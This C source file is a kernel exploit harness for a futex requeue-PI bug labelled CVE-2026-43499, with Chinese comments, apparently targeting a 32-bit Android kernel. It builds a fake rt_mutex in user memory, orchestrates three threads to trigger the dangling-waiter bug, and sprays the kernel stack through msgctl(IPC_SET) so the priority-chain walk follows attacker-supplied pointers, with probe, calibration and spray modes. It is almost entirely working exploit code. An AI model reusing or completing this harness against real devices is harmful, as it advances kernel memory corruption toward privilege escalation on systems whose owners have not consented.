/* CVE-2026-43499 栈重塑实测：msgctl(IPC_SET, IPC_OLD) 部分栈写入
 *
 * 修复后的深度模型：
 *   waiter 在 syscall entry_sp - 0x1B0
 *   msgctl IPC_OLD 的 struct msqid_ds(0x38B) 在 entry_sp - 0x190
 *   => 缓冲区起点 = waiter + 0x20，写入 waiter+0x20 .. waiter+0x57
 *   => buf[0x08] -> waiter->task(+0x28)   buf[0x0C] -> waiter->lock(+0x2C)
 *   => 完全不碰 waiter+0x0C..0x13（node_list，必须保持自指）
 *
 * 用法: ./ms probe   假锁 wait_lock=0, lock+0x34=0xdeadbeef -> 链走到 rt_mutex_top_waiter
 *                    的 BUG_ON 就 panic，寄存器里能看见 0xdeadbeef = 铁证命中
 *       ./ms pass    假锁全部合法 -> 链走正常返回，T 正常阻塞（不崩）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <time.h>
#include <errno.h>
#include <stdint.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sched.h>

#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7

#define INIT_TASK 0xc0b79be0u          /* kallsyms 提取值 */
#define MSGCTL_IPC_SET 1               /* cmd=1 -> 无 IPC_64 位 -> IPC_OLD 分支 */

static int futex(uint32_t *u, int op, uint32_t val, const struct timespec *to,
                 uint32_t *u2, uint32_t val3)
{
	return syscall(SYS_futex, u, op, val, to, u2, val3);
}

/* futex 字：同一进程内线程共享 */
static uint32_t u1, u2, u3, u4;

static volatile int a_started, b_locked_u2, sprayed, t_done;
static volatile int a_ret = 999, a_err = 0, b_ret = 999, t_ret = 999, t_err = 0;
static volatile int c_ret = 999, c_err = 0;
static void *fake_lock;
static int g_nospray = 0;
static int g_park = 0;                  /* 只阻塞不喷：量活体 waiter */
static int g_mark = 0;                  /* 标尺喷：用 fault 地址反推落点 */
static int g_sonly = 0;                 /* 只喷不触发：喷完原地自旋，等外部 dump */
static volatile int a_tid;
static int g_msqid = -1;   /* 必须在喷之前用 msgget 建好，否则 msgctl 直接 EINVAL、栈拷贝不发生 */
static volatile int m_ret = 999, m_err = 0;
static unsigned char spray_buf[0x38] __attribute__((aligned(8)));

static FILE *lg;

static void logf_(const char *fmt, ...)
{
	va_list ap;
	char buf[512];
	int n;
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof buf, fmt, ap);
	va_end(ap);
	if (lg) { fwrite(buf, 1, n, lg); fflush(lg); fsync(fileno(lg)); }
	write(1, buf, n);
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof s, &s);
}

static void build_fake(int probe)
{
	unsigned char *p = (unsigned char *)fake_lock;
	memset(p, 0, 0x200);
	/* raw_spinlock_t wait_lock @ +0x00 (GENERIC_LOCKBREAK: raw_lock 4 + break_lock 4) */
	*(uint32_t *)(p + 0x00) = 0;          /* 0 = 未锁，trylock 会成功 */
	*(uint32_t *)(p + 0x04) = 0;
	/* plist_head wait_list @ +0x08 = { node_list } */
	*(uint32_t *)(p + 0x08) = (uint32_t)(uintptr_t)(p + 0x08);   /* next = self */
	*(uint32_t *)(p + 0x0C) = (uint32_t)(uintptr_t)(p + 0x08);   /* prev = self */
	/* owner @ +0x10 = NULL：走 !rt_mutex_owner(lock) 分支，不碰 task 指针 */
	*(uint32_t *)(p + 0x10) = 0;
	/* 空 wait_list 时 plist_first_entry 得到 node_list 指针 = lock+0x08，
	   反汇编 0xc00830e8 显示 BUG_ON 读 *(node_list_ptr + 0x20) = *(lock+0x28) */
	*(uint32_t *)(p + 0x28) = probe ? 0xdeadbeefu : (uint32_t)(uintptr_t)p;
	/* 兜底：w->task = init_task（state=0，wake_up_process 会立刻返回） */
	*(uint32_t *)(p + 0x30) = INIT_TASK;
	__sync_synchronize();
}

/* A：持 u4/u3 -> 在 u1 上 WAIT_REQUEUE_PI(u2) -> 超时返回后立刻 msgctl 喷栈 */
static void *thread_a(void *arg)
{
	int r;
	(void)arg;
	pin_cpu(0);
	a_tid = syscall(SYS_gettid);

	r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	r = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	a_started = 1;
	__sync_synchronize();

	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += g_park ? 600 : 2;
	ts.tv_nsec += 300 * 1000 * 1000;
	while (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }

	r = futex(&u1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &u2, 0);
	a_ret = r;
	a_err = errno;

	/* 关键：此后到 msgctl 之间不能有任何 syscall */
	if (g_park) {
		m_ret = -12345;         /* 明确标记"没喷" */
	} else if (!g_nospray) {
		m_ret = (int)syscall(SYS_msgctl, g_msqid, MSGCTL_IPC_SET, spray_buf);
		m_err = errno;
	}
	if (g_sonly) {
		sprayed = 1;
		__sync_synchronize();
		/* 绝不能 syscall：任何新帧都会覆盖刚喷好的 waiter 区 */
		for (;;)
			__sync_synchronize();
	}
	{
		int saved = errno;
		sprayed = 1;
		__sync_synchronize();
		/* 等 T 的链走结束（纯自旋，不发 syscall） */
		long g = 0;
		while (!t_done && g++ < 400000000L)
			;
		(void)saved;
	}
	futex(&u4, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
	return NULL;
}

/* B：持 u2，然后阻塞在 u3（A 持有） */
static void *thread_b(void *arg)
{
	int r;
	(void)arg;
	pin_cpu(1);
	/* 降优先级：让 B 在 A->pi_waiters 里排到 T 后面，
	   否则 adjust_prio_chain 第 66 行会因 top_waiter 不匹配而提前退出 */
	nice(19);
	futex(&u2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_locked_u2 = 1;
	__sync_synchronize();
	r = futex(&u3, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	b_ret = r;
	return NULL;
}

/* T：在 u4 上阻塞 -> 触发链走读 A->pi_blocked_on */
static void *thread_t(void *arg)
{
	int r;
	(void)arg;
	pin_cpu(2);
	while (!sprayed) __sync_synchronize();
	r = futex(&u4, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
	t_ret = r;
	t_err = errno;
	t_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(int argc, char **argv)
{
	int probe = (argc > 1 && argv[1][0] == 'p' && argv[1][1] == 'r');
	int nospray = (argc > 1 && argv[1][0] == 'n');
	int park = (argc > 1 && !strcmp(argv[1], "park"));
	int mark = (argc > 1 && !strcmp(argv[1], "mark"));
	int sonly = (argc > 1 && !strcmp(argv[1], "spray"));
	g_nospray = nospray;
	g_park = park;
	g_mark = mark;
	g_sonly = sonly;
	setvbuf(stdout, NULL, _IONBF, 0);
	lg = fopen("/data/local/tmp/ms.log", "w");

	void *pg = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
	                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pg == MAP_FAILED) { logf_("[!] mmap fail\n"); return 1; }
	fake_lock = (void *)(((uintptr_t)pg + 0xFFF) & ~0xFFFu);
	build_fake(probe);

	memset(spray_buf, 0, sizeof spray_buf);
	if (sonly) {
		int i;
		for (i = 0; i < (int)(sizeof spray_buf / 4); i++)
			*(uint32_t *)(spray_buf + i * 4) = 0xcafe0000u + (uint32_t)i * 4u;
	} else if (mark) {
		/* 标尺：每个字都是独一无二的未映射地址 0xdead0000+4i。
		 * 链走第一个解引用的字段是 waiter->lock(+0x2C)，
		 * fault 地址会原样打印 → 直接反推哪个字落到了 +0x2C。 */
		int i;
		for (i = 0; i < (int)(sizeof spray_buf / 4); i++)
			*(uint32_t *)(spray_buf + i * 4) = 0xdead0000u + (uint32_t)i * 4u;
	} else {
		*(uint32_t *)(spray_buf + 0x08) = INIT_TASK;                     /* waiter->task */
		*(uint32_t *)(spray_buf + 0x0C) = (uint32_t)(uintptr_t)fake_lock; /* waiter->lock */
	}

	/* 关键：SysV 消息队列必须先真的存在。
	 * 之前 harness 用 msqid=0 —— 只有在“恰好存在 id=0 的队列”时才会真的
	 * 拷贝；否则 msgctl 在 ipcctl_pre_down 里返回 EINVAL，copy_msqid_from_user
	 * 的栈写入虽然发生但……实测整页栈里搜不到图案，等于喷了个空。
	 * （隔离实验：无队列时 EINVAL 且栈上 0 命中；msgget 建出 id=0 后返回 0。） */
	g_msqid = (int)syscall(SYS_msgget, 0 /*IPC_PRIVATE*/, 0666);
	logf_("msqid=%d\n", g_msqid);

	logf_("=== mode=%s pid=%d ===\n", nospray ? "NOSPRAY" : (probe ? "probe" : "pass"), getpid());
	logf_("fake_lock=%p  target waiter = stack_top-0x208\n", fake_lock);

	pthread_t ta, tb, tt;
	pthread_create(&ta, NULL, thread_a, NULL);
	while (!a_started) usleep(1000);
	usleep(150000);

	pthread_create(&tb, NULL, thread_b, NULL);
	while (!b_locked_u2) usleep(1000);
	usleep(250000);

	if (!park && !sonly)
		pthread_create(&tt, NULL, thread_t, NULL);

	c_ret = futex(&u1, FUTEX_CMP_REQUEUE_PI, 1, NULL, &u2, 0);
	c_err = errno;
	logf_("[C] CMP_REQUEUE_PI = %d errno=%d %s\n", c_ret, c_err,
	      (c_ret < 0 && c_err == 35) ? "*** HIT EDEADLK (bug fired) ***" : "(no deadlock?)");
	logf_("[C] u1=%#x u2=%#x u3=%#x u4=%#x\n", u1, u2, u3, u4);

	if (sonly) {
		/* 主线程等 A 完成喷栈，然后自己写 wdump —— 不碰 A 的栈，
		 * 也不需要 ktool 的 exploit（模块 su_path 指向本程序即可过门禁） */
		char cmd[64];
		int fd, n, w, e;

		logf_("[S] a_tid=%d  (sprayed, spinning, no T)\n", a_tid);
		while (!sprayed)
			usleep(20000);
		fd = open("/dev/ktool", O_WRONLY);
		n = snprintf(cmd, sizeof cmd, "wfind %d cafe0000", (int)a_tid);
		w = (fd >= 0) ? (int)write(fd, cmd, n) : -1;
		e = errno;
		if (fd >= 0)
			close(fd);
		logf_("[S] wfind tid=%d fd=%d w=%d/%d errno=%d\n",
		      a_tid, fd, w, n, e);
		logf_("[S] A: futex=%d/%d msgctl=%d/%d\n",
		      a_ret, a_err, m_ret, m_err);
		for (;;)
			sleep(3);
	}
	if (park) {
		logf_("[P] a_tid=%d  (blocked, no spray, no T)\n", a_tid);
		logf_("[P] measure: echo \"waiter %d\" > /dev/ktool\n", a_tid);
		logf_("[P] parked, pid=%d\n", getpid());
		for (;;)
			sleep(3);
	}

	pthread_join(ta, NULL);
	pthread_join(tt, NULL);

	logf_("[A] WAIT_REQUEUE_PI=%d errno=%d  msgctl=%d errno=%d\n",
	      a_ret, a_err, m_ret, m_err);
	logf_("[T] LOCK_PI(u4)=%d errno=%d\n", t_ret, t_err);
	logf_("[B] LOCK_PI(u3)=%d\n", b_ret);
	logf_("*** RESULT: %s ***\n",
	      probe ? (t_ret == 999 ? "T 未返回（可能已 panic）" : "T 正常返回 => 链走未命中假锁")
	            : (t_ret == 0 ? "T 拿到 u4，链走全程无异常" : "T 返回异常"));
	sleep(1);
	return 0;
}
